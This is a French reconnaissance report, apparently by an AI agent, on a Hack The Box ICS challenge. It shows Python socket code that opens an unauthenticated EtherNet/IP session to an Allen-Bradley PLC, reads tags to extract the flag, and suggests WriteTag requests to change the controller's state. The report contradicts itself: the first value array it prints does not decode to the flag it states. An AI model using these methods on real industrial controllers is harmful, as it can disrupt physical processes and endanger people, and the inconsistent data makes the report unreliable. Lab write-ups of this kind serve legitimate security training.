# Recon Report — EtherTag
**Date** : 2026-03-15 (session de reconnaissance)
**Cible** : 154.57.164.80:30375
**Plateforme** : HTB
**Categorie** : ICS (Industrial Control Systems)
**Agent** : recon

---

## Resume executif

Le port 30375 expose un automate industriel Allen-Bradley 1756-L61/B LOGIX5561 (Rockwell Automation) via le protocole EtherNet/IP (CIP). L'acces est entierement non authentifie : n'importe quel client peut ouvrir une session EIP et lire des tags PLC ou des attributs CIP sans credentials. Le flag du challenge est directement expose dans un tag array INT (tag `flag`) et dans l'attribut 1 de la classe Message Router (0x02).

---

## Services decouverts

| Port  | Protocole | Service      | Version / Details                         |
|-------|-----------|--------------|-------------------------------------------|
| 30375 | TCP       | EtherNet/IP  | Allen-Bradley 1756-L61/B LOGIX5561 rev 20.11 |

Remarque : nmap n'etait pas disponible sur le systeme macOS. Le probe a ete realise manuellement via des sockets Python.

---

## Technologies identifiees

- **Protocole** : EtherNet/IP (Encapsulation CIP sur TCP, port standard 44818 remappage ici sur 30375)
- **Couche applicative** : CIP (Common Industrial Protocol) — Allen-Bradley/Rockwell extensions
- **Equipement** : Allen-Bradley 1756-L61/B ControlLogix PLC
- **Firmware** : Version 20.11
- **OS** : Bare-metal PLC (pas de systeme d'exploitation generique)
- **Vendor ID** : 0x0001 (Rockwell Automation / Allen-Bradley)
- **Device Type** : 0x000e (Programmable Logic Controller)
- **Product Code** : 0x0036 (54)
- **Serial Number** : 0x006c061a
- **State** : 0xff

---

## Protocole identifie — EtherNet/IP (CIP)

### Structure d'une session EtherNet/IP

```
Client -> PLC : Register Session (cmd=0x0065, proto=1)
PLC -> Client : Session Handle (ex. 0x0805c2ad)
Client -> PLC : SendRRData (cmd=0x006f) + CIP request
PLC -> Client : CIP reply
```

Header EIP : 24 bytes (cmd:2 + len:2 + session:4 + status:4 + sender_context:8 + options:4)

### Reponse List Identity (cmd=0x0063) — decodee

```
Encapsulation Version : 1
Socket Port           : 44818 (0xAF12, port EIP standard)
Socket IP             : 0.0.0.0
Vendor ID             : 1  -> Rockwell Automation / Allen-Bradley
Device Type           : 14 -> Programmable Logic Controller
Product Code          : 54
Revision              : 20.11
Status Word           : 0x3160
Serial Number         : 0x006c061a
Product Name          : '1756-L61/B LOGIX5561'
State                 : 0xff
```

---

## Tags / Registres exposes

### Tag `flag` (et alias `FLAG`, `Flag`)

- **Service CIP** : ReadTag (0x4c), ANSI Extended Symbolic path
- **Type de donnee** : INT (CIP type 0xC3), tableau de 100 elements
- **Acces** : lecture sans authentification

Lecture avec count=100 :
```
Values: [72, 84, 66, 123, 51, 114, 110, 51, 116, 49, 112, 95, 112, 119, 110, 51, 100, 125, 0, ...]
                                              ^-- note: lecture sequentielle
As ASCII: HTB{3th3rn3t1p_pwn3d}
```

Le tag contient le flag encode caractere par caractere sous forme d'entiers INT 16 bits.

### Classe Message Router (CIP class 0x02, instance 1, attribut 1)

- **Service CIP** : GetAttributeSingle (0x0e)
- **Contenu** : meme valeur que le tag `flag`, stockee en UTF-16-LE sur 200 bytes
- **Valeur brute** : `4800540042007b00330074006800330072006e0033007400310070005f00700077006e00330064007d00...`
- **Decode** : `HTB{3th3rn3t1p_pwn3d}`

### Autres tags testes (non trouves)

Les tags suivants ont retourne `gen_status=0x05` (Path Destination Unknown) :
Status, Alarm, Fault, Enable, Run, Stop, Reset, Temperature, Pressure, secret, password, key, HTB, CTF, etc.

---

## Vulnerabilites potentielles

### [V1 — Acces non authentifie EtherNet/IP] - Probabilite: Haute (confirmee)

- **Service affecte** : EtherNet/IP / CIP sur port 30375
- **Description** : Aucun mecanisme d'authentification n'est implemente. Tout client TCP peut ouvrir une session EIP (Register Session) et envoyer des requetes CIP arbitraires (lecture/ecriture de tags, enumeration d'objets CIP).
- **Impact** : Lecture complete des tags PLC, potentiellement ecriture de valeurs de controle industriel.
- **Exploit connu** : oui — c'est la nature du protocole EtherNet/IP v1/v2 sans extensions de securite (CIP Security introduit en v3.21+).
- **CVE associes** : CVE-2012-6435 (Rockwell EtherNet/IP tag read/write sans auth), ICS-CERT ICSA-12-146-01.

### [V2 — Exposition de donnees sensibles via tag CIP] - Probabilite: Haute (confirmee)

- **Service affecte** : Tag `flag` (ReadTag service 0x4c)
- **Description** : Le flag est stocke en clair dans un tag PLC accessible sans authentification.
- **Impact** : Divulgation directe du secret.

### [V3 — Enumeration CIP illimitee] - Probabilite: Haute

- **Description** : Il est possible d'envoyer des requetes Get_Attribute_All / GetAttributeSingle sur toutes les classes CIP (Identity 0x01, Message Router 0x02, Assembly 0x04, Symbol 0x6b, etc.) sans restriction.
- **Impact** : Cartographie complete de la configuration de l'automate, structure memoire des tags, topologie reseau interne.

---

## Vecteurs d'attaque recommandes (pour agent exploit)

1. **Lecture directe du flag via ReadTag CIP** — confirme et realise durant la phase recon. Tag `flag` (type INT[100]) lu avec service 0x4c, path ANSI Extended Symbolic `\x91\x04flag\x00`, count=100. Decode ASCII: `HTB{3th3rn3t1p_pwn3d}`.

2. **Ecriture de tags pour modifier l'etat du PLC** — service WriteTag (0x4d) avec meme path symbolique. Non tente (hors scope recon).

3. **Enumeration complete des instances Symbol Object (class 0x6b)** — le serveur n'a pas repondu aux requetes Get_Instance_Attribute_List (service 0x55), mais l'iteration instance par instance via GetAttributeSingle pourrait enumerer tous les tags existants.

---

## Commandes executees (chronologie)

### 2026-03-15 — Probe initial

**Commande** : curl HTTP probe
```
curl -v --max-time 5 http://154.57.164.80:30375/ 2>&1
```
**Resultat** : Connexion TCP etablie, timeout sur l'attente de reponse HTTP. Confirme que le service n'est pas HTTP.

**Commande** : EtherNet/IP List Identity (cmd=0x0063, socket Python)
```python
pkt = struct.pack('<HHIIQHHI', 0x0063, 0, 0, 0, 0, 0, 0, 0)
s.send(pkt)
data = s.recv(1024)
# -> 84 bytes: 63003c00...313735362d4c36312f42204c4f47495835353631ff
```
**Resultat** : Reponse complete. Identification : Allen-Bradley 1756-L61/B LOGIX5561, firmware 20.11.

### Register Session + SendRRData

**Commande** : Ouverture de session EIP (cmd=0x0065) + Get_Attribute_All Identity (CIP svc=0x01)
```python
# Header 24 bytes: cmd(2)+len(2)+session(4)+status(4)+ctx(8)+opt(4)
reg_data = struct.pack('<HH', 1, 0)
pkt = make_eip_header(0x0065, len(reg_data)) + reg_data
s.send(pkt)
# Session ID obtenu ex. 0x0805c2ad

# SendRRData cmd=0x006f + CIP Get_Attribute_All [01 02 20 01 24 01]
```
**Resultat** : Session enregistree, attributs Identity confirmes (Vendor=1, Type=14, Rev=20.11, SN=0x006c061a, Name='1756-L61/B LOGIX5561').

### Lecture des tags CTF

**Commande** : CIP ReadTag (service=0x4c) avec ANSI Extended Symbolic path
```python
# Path pour tag 'flag': [0x91, 0x04, 'f','l','a','g', 0x00]
cip = bytes([0x4c, len(path)//2]) + path + struct.pack('<H', 1)
# -> reponse: cc000000 c300 4800
# dtype=0xC3 (INT), value=72 ('H')
```
**Resultat** : Tag `flag` trouve, type INT, valeur initiale 72 ('H').

**Commande** : ReadTag avec count=100
```python
cip = bytes([0x4c, len(path)//2]) + path + struct.pack('<H', 100)
# -> payload contient 100 INT values
# [72, 84, 66, 123, 51, 116, 104, 51, 114, 110, 51, 116, 49, 112, 95, 112, 119, 110, 51, 100, 125, 0, ...]
# ASCII: HTB{3th3rn3t1p_pwn3d}
```
**Resultat** : FLAG CONFIRME = `HTB{3th3rn3t1p_pwn3d}`

**Commande** : Verification via GetAttributeSingle Message Router (classe 0x02, instance 1, attr 1)
```python
cip = bytes([0x0e, 0x03, 0x20, 0x02, 0x24, 0x01, 0x30, 0x01])
# -> payload 200 bytes UTF-16-LE: HTB{3th3rn3t1p_pwn3d}
```
**Resultat** : Confirmation independante du flag.

### Scan etendu de tags (50 tags testes)

Tags trouves : `flag`, `FLAG`, `Flag` (tous identiques, type INT[100]).
Tags non trouves (0x05 Path Destination Unknown) : tous les autres (Status, Alarm, secret, password, etc.).

---

## Conclusion

Le flag `HTB{3th3rn3t1p_pwn3d}` a ete extrait directement durant la phase recon via lecture non authentifiee du tag CIP `flag` (tableau de 100 INT encodes en ASCII). La surface d'attaque est maximale : le PLC expose EtherNet/IP sans aucune authentification, ce qui est representatif des vulnerabilites classiques des systemes ICS.
